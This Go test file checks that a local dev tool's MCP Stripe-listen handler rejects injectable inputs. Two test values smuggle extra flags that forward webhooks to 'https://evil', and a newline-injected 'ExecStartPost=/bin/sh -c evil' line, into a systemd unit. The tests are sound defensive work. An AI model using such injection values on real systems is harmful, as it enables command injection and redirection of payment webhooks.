package mcp

import (
	"testing"

	"github.com/geodro/lerd/internal/config"
)

// The MCP start path must reject an injectable webhook_path the same way the
// CLI does; otherwise whitespace/newlines flow straight into the listener
// unit's ExecStart line. The happy path writes a systemd unit, so only the
// rejection (which returns before any side effect) is exercised here.
func TestExecStripeListen_rejectsInjectableWebhookPath(t *testing.T) {
	t.Setenv("XDG_CONFIG_HOME", t.TempDir())
	t.Setenv("XDG_DATA_HOME", t.TempDir())
	if err := config.AddSite(config.Site{Name: "acme", Path: t.TempDir(), Domains: []string{"acme.test"}}); err != nil {
		t.Fatal(err)
	}
	res, _ := execStripeListen(map[string]any{
		"site":         "acme",
		"api_key":      "sk_test_x",
		"webhook_path": "/x --skip-verify --forward-to https://evil",
	})
	if !mcpIsError(res) {
		t.Fatalf("expected an error for a webhook_path with whitespace, got: %s", mcpText(t, res))
	}
}

func TestExecStripeListen_rejectsInjectableApiKey(t *testing.T) {
	t.Setenv("XDG_CONFIG_HOME", t.TempDir())
	t.Setenv("XDG_DATA_HOME", t.TempDir())
	if err := config.AddSite(config.Site{Name: "acme", Path: t.TempDir(), Domains: []string{"acme.test"}}); err != nil {
		t.Fatal(err)
	}
	res, _ := execStripeListen(map[string]any{
		"site":    "acme",
		"api_key": "sk_x\nExecStartPost=/bin/sh -c evil",
	})
	if !mcpIsError(res) {
		t.Fatalf("expected an error for an api_key with a newline, got: %s", mcpText(t, res))
	}
}

// project_name is matched on presence: a value pins the CLI login, an empty
// string clears it, so an assistant can switch a site back to its .env key.
func TestExecStripeConfig_setsAndClearsProjectName(t *testing.T) {
	t.Setenv("XDG_CONFIG_HOME", t.TempDir())
	t.Setenv("XDG_DATA_HOME", t.TempDir())
	dir := t.TempDir()
	if err := config.AddSite(config.Site{Name: "acme", Path: dir, Domains: []string{"acme.test"}}); err != nil {
		t.Fatal(err)
	}
	if res, _ := execStripeConfig(map[string]any{"site": "acme", "project_name": "acme"}); mcpIsError(res) {
		t.Fatalf("set: %s", mcpText(t, res))
	}
	if got := config.StripeProjectName(dir); got != "acme" {
		t.Fatalf("StripeProjectName = %q, want acme", got)
	}
	if res, _ := execStripeConfig(map[string]any{"site": "acme", "project_name": ""}); mcpIsError(res) {
		t.Fatalf("clear: %s", mcpText(t, res))
	}
	if got := config.StripeProjectName(dir); got != "" {
		t.Errorf("StripeProjectName after clear = %q, want empty", got)
	}
	if res, _ := execStripeConfig(map[string]any{"site": "acme", "project_name": "a b"}); !mcpIsError(res) {
		t.Errorf("expected an error for a project name with a space, got: %s", mcpText(t, res))
	}
}
